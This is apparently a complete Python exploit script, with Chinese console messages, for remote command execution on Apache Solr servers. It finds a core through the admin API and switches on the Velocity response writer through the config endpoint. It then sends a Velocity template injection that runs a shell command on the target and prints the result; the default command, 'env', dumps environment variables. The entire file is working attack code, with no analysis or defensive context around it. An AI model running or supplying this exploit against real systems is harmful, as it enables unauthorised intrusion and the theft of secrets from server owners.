import sys
import requests
import json
from termcolor import cprint
from urllib.parse import quote


class SolrRce:
    def __init__(self, url, command):
        self.url = url
        self.command = command
        self.core_name = self.get_core_name()
        self.available = self.enable_cort_params()

    def get_core_name(self):
        cort_name_url = self.url + "/solr/admin/cores?wt=json&indexInfo=false"
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
        }
        try:
            response = requests.get(cort_name_url, headers=header, timeout=1)
            if response.status_code == 200:
                cprint('[*] 检查solr配置', 'yellow')
        except requests.RequestException:
            cprint('[-] URL: %s 连接失败' % self.url, 'yellow', 'on_red')
            sys.exit(0)

        core_name = list(json.loads(response.text)["status"])
        if core_name:
            cprint('[*] 获取solr core_name 成功: %s' % core_name[0], 'yellow')
            return core_name[0]

        else:
            cprint('[-] 未找到core_name, 请检查solr admin配置 ',  'yellow', 'on_red')
            sys.exit(0)

    def enable_cort_params(self):
        header = {
            "Content-Type": "application/json",
            "Content-Length": "259",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
        }
        body = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }
        params_enable_url = self.url + "/solr/" + self.core_name + "/config"
        response = requests.post(url=params_enable_url, json=body, headers=header)

        if response.json()["responseHeader"]["status"] == 0:
            return True
        else:
            return False

    def exp(self):
        if self.available is False:
            cprint('[*] URL: %s 注入失败' % self.url,  'yellow', 'on_red')
            sys.exit(0)

        else:
            cprint('[*] 修改core name配置成功，尝试执行系统命令', 'yellow')
            exp_code1 = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom="

            exp_code2 = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) " \
                        "#set($chr=$x.class.forName('java.lang.Character')) " \
                        "#set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('"
            exp_code3 = "')) $ex.waitFor() #set($out=$ex.getInputStream()) " \
                        "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"

            end_url = self.url + "/solr/" + self.core_name + exp_code1 + quote(exp_code2 + self.command +
                                                                               exp_code3, 'utf-8')
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/78.0.3904.70 Safari/537.36"
            }
            cmd_result = requests.get(end_url, headers=header)
            if cmd_result.status_code == 500:
                cprint('[-] URL: %s 系统命令执行失败' % self.url, 'yellow', 'on_red')
            else:
                cprint('[*] 命令执行结果: \n %s' % cmd_result.text, 'yellow')


host = sys.argv[1]
solr_url = "http://%s:8983" % host
cmd = 'env'
solr = SolrRce(solr_url, cmd)
solr.exp()
